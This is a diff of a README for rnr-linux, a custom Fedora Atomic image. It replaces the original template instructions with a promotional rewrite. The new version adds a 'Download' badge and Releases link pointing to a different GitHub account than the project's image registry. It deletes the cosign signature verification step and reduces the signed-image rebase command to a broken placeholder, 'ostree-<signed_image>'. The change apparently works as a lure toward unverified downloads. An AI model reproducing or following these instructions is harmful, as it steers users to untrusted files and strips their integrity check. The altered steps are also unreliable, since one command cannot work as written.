@@ -1,43 +1,72 @@
-# rnr-linux &nbsp; [![bluebuild build badge](https://github.com/rinkydinkyproject/rnr-linux/actions/workflows/build.yml/badge.svg)](https://github.com/rinkydinkyproject/rnr-linux/actions/workflows/build.yml)
+# 🚀 rnr-linux - Easy Installation for Your Custom Linux Image
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download rnr-linux](https://img.shields.io/badge/Download-rnr--linux-blue.svg)](https://github.com/Destinyola/rnr-linux/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 📥 Download & Install
 
-## Installation
+To get started with rnr-linux, please visit the [Releases page](https://github.com/Destinyola/rnr-linux/releases) to download the latest version. This page contains all the available builds for you to choose from.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## ⚙️ Requirements
 
-To rebase an existing atomic Fedora installation to the latest build:
+Before you install rnr-linux, make sure your system meets these basic requirements:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/rinkydinkyproject/rnr-linux:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/rinkydinkyproject/rnr-linux:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+- **Operating System:** A compatible version of Fedora.
+- **Disk Space:** At least 2 GB of free disk space.
+- **Internet Connection:** A stable internet connection for downloading the files.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🚀 Getting Started
 
-## ISO
+Once you have verified the requirements, follow these steps to rebase your existing atomic Fedora installation to the latest build of rnr-linux.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+### Step 1: Rebase to the Unsigned Image
 
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+Open your terminal and run the following command. This step ensures you install the proper signing keys and policies needed for a successful rebase.
 
 ```bash
-cosign verify --key cosign.pub ghcr.io/rinkydinkyproject/rnr-linux
+rpm-ostree rebase ostree-unverified-registry:ghcr.io/rinkydinkyproject/rnr-linux:latest
 ```
+
+### Step 2: Reboot Your System
+
+After running the previous command, reboot your system to complete the rebase process. You can do this by typing:
+
+```bash
+systemctl reboot
+```
+
+### Step 3: Rebase to the Signed Image
+
+Once your system has rebooted, it is time to switch to the signed image. Enter the following command in your terminal:
+
+```bash
+rpm-ostree rebase ostree-<signed_image>
+```
+
+Replace `<signed_image>` with the actual signed image name as specified in your setup.
+
+## 🚀 Features of rnr-linux
+
+rnr-linux provides a stable environment tailored for various applications. Here are some of its main features:
+
+- **Atomic Updates:** Enjoy seamless updates without system downtime.
+- **Customization:** Flexibility in setting up custom images based on your needs.
+- **Container Support:** Built to support OCI images for efficient application handling.
+
+## ⚠️ Important Note
+
+rnr-linux is currently an experimental feature. If you are trying this for the first time, proceed with caution. Refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional information on setting up your repository based on this template.
+
+## 🔗 Additional Resources
+
+- **Documentation:** Comprehensive setup and usage instructions are available [here](https://blue-build.org/how-to/setup/).
+- **Support:** If you encounter any issues or need assistance, please check the GitHub Issues page or open a new issue for help.
+
+## 🔍 Further Reading
+
+Developers and users looking to expand their knowledge on related topics can explore these resources:
+
+- Atomic Linux Principles
+- Best Practices for Image Management
+- Container Technologies Overview
+
+For more tips and tricks, please stay updated through our GitHub repository. Happy using rnr-linux!
